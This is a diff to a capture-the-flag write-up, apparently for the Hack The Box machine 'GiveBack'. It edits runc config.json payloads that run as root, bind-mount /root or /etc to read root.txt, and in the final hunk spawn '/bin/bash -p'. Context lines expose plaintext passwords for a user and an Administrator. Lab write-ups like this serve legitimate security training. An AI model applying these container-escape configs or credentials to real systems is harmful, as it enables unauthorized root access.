@@ -873,156 +873,9 @@ curl --cacert /run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization
 
 
 
-```bash
-cat > config.json << 'EOF'
-{
-  "ociVersion": "1.0.2",
-  "process": {
-    "terminal": false,
-    "user": {
-      "uid": 0,
-      "gid": 0
-    },
-    "args": [
-      "/bin/cat",
-      "/root/root.txt"
-    ],
-    "env": [
-      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
-      "TERM=xterm"
-    ],
-    "cwd": "/",
-    "noNewPrivileges": true
-  },
-  "root": {
-    "path": "rootfs",
-    "readonly": true
-  },
-  "mounts": [
-    {
-      "destination": "/proc",
-      "type": "proc",
-      "source": "proc"
-    },
-    {
-      "destination": "/bin",
-      "type": "bind",
-      "source": "/bin",
-      "options": ["bind", "ro", "nosuid", "nodev"]
-    },
-    {
-      "destination": "/lib",
-      "type": "bind",
-      "source": "/lib",
-      "options": ["bind", "ro", "nosuid", "nodev"]
-    },
-    {
-      "destination": "/lib64",
-      "type": "bind",
-      "source": "/lib64",
-      "options": ["bind", "ro", "nosuid", "nodev"]
-    },
-    {
-      "destination": "/root",
-      "type": "bind",
-      "source": "/root",
-      "options": ["bind", "ro", "nosuid", "nodev"]
-    }
-  ],
-  "linux": {
-    "namespaces": [
-      { "type": "mount" },
-      { "type": "pid" },
-      { "type": "uts" },
-      { "type": "ipc" }
-    ]
-  }
-}
-EOF
-```
-
-
-
-
-
 babywyrm@giveback Password: Hv74gMREZwEVUBbYhXOE0tHoA5azXwk
 Administrator Password: sW5sp4spa3u7RLyetrekE4oS
 
-```config.json
-cat > config.json << 'EOF'
-{
-  "ociVersion": "1.0.2",
-  "process": {
-    "user": {
-      "uid": 0,
-      "gid": 0
-    },
-    "args": [
-      "/bin/cat",
-      "/root/root.txt"
-    ],
-    "cwd": "/",
-    "env": [
-      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
-    ],
-    "terminal": false
-  },
-  "root": {
-    "path": "rootfs"
-  },
-  "mounts": [
-    {
-      "destination": "/proc",
-      "type": "proc",
-      "source": "proc"
-    },
-    {
-      "destination": "/bin",
-      "type": "bind",
-      "source": "/bin",
-      "options": [
-        "bind",
-        "ro"
-      ]
-    },
-    {
-      "destination": "/lib",
-      "type": "bind",
-      "source": "/lib",
-      "options": [
-        "bind",
-        "ro"
-      ]
-    },
-    {
-      "destination": "/lib64",
-      "type": "bind",
-      "source": "/lib64",
-      "options": [
-        "bind",
-        "ro"
-      ]
-    },
-    {
-      "destination": "/root",
-      "type": "bind",
-      "source": "/root",
-      "options": [
-        "bind",
-        "ro"
-      ]
-    }
-  ],
-  "linux": {
-    "namespaces": [
-      {
-        "type": "mount"
-      }
-    ]
-  }
-}
-EOF
-```
 
 ![GiveBack](htb_Giveback_controllermanger_masterpass.png)
 
@@ -1129,47 +982,20 @@ cat > config.json << 'EOF'
 {
   "ociVersion": "1.0.2",
   "process": {
-    "user": { "uid": 0, "gid": 0 },
-    "args": [ "/bin/cat", "/mnt/../root/root.txt" ],
-    "cwd": "/",
-    "env": [
-      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
-    ],
-    "terminal": false
-  },
-  "root": { "path": "rootfs" },
-  "mounts": [
-    { "destination": "/proc", "type": "proc", "source": "proc" },
-    { "destination": "/bin", "type": "bind", "source": "/bin", "options": ["bind", "ro"] },
-    { "destination": "/lib", "type": "bind", "source": "/lib", "options": ["bind", "ro"] },
-    { "destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["bind", "ro"] },
-    { "destination": "/mnt", "type": "bind", "source": "/etc", "options": ["bind", "ro"] }
-  ],
-  "linux": {
-    "namespaces": [ { "type": "mount" } ]
-  }
-}
-EOF
-```
-
-```bash
-cat > config.json << 'EOF'
-{
-  "ociVersion": "1.0.2",
-  "process": {
     "user": {
       "uid": 0,
       "gid": 0
     },
     "args": [
-      "/bin/cat",
-      "/root/root.txt"
+      "/bin/bash",
+      "-p"
     ],
     "cwd": "/",
     "env": [
-      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+      "TERM=xterm"
     ],
-    "terminal": false
+    "terminal": true
   },
   "root": {
     "path": "rootfs"
@@ -1184,43 +1010,34 @@ cat > config.json << 'EOF'
       "destination": "/bin",
       "type": "bind",
       "source": "/bin",
-      "options": [
-        "bind",
-        "ro"
-      ]
+      "options": ["bind", "ro"]
     },
     {
       "destination": "/lib",
       "type": "bind",
       "source": "/lib",
-      "options": [
-        "bind",
-        "ro"
-      ]
+      "options": ["bind", "ro"]
     },
     {
       "destination": "/lib64",
       "type": "bind",
       "source": "/lib64",
-      "options": [
-        "bind",
-        "ro"
-      ]
+      "options": ["bind", "ro"]
     },
     {
-      "destination": "/root",
+      "destination": "/mnt",
       "type": "bind",
-      "source": "/root",
-      "options": [
-        "bind",
-        "ro"
-      ]
+      "source": "/etc",
+      "options": ["bind", "ro"]
     }
   ],
   "linux": {
     "namespaces": [
       {
         "type": "mount"
+      },
+      {
+        "type": "pid"
       }
     ]
   }
